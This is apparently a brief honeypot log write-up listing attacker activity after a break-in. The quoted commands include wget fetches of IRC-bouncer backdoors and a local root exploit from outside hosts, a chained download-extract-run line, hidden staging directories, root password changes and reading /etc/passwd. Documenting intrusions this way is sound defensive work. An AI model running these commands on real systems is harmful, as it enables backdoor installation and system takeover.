honeypots:

honeypot was broken by attackers few days ago - I couldn't check that due to
the pycon. I found couple of interesting attempts on the honeypot.

1. consuming network bandwidth

  wget
http://www.kernel.org/pub/dist/knoppix-dvd/KNOPPIX_V4.0.2DVD-2005-09-23-DE.iso
  wget
http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe

2. install backdoor/irc boot (after logined as root user)

 wget linuxsystem.evonet.ro/psybnc-linux.tar
 wget corina.100free.com/san4o.tar;tar xvf san4o.tar;rm -rf san4o.tar;cd
.,;sh
 wget freewebtown.com/raph27/psybnc-linux.jpg

 on /dev/shm
      /var/tmp/. " "
      /tmp/.bash
      /tmp/. " "

3.  local exploit (after logined as "test" user)

 wget 125.200.80.210/laks.tgz

;; sus
;; mv
;; name

local exploits to gain root privileges

4. change root's password (my sshd wrote a log on accesses)
(123456 was default)
;; user:root, passwd:frank
;; user:root, passwd:iacovlev

5. check cpuinfo (real human attackers, couple of typos)
uptime
cat /etc/passwd
cat /proc/cpuinfo
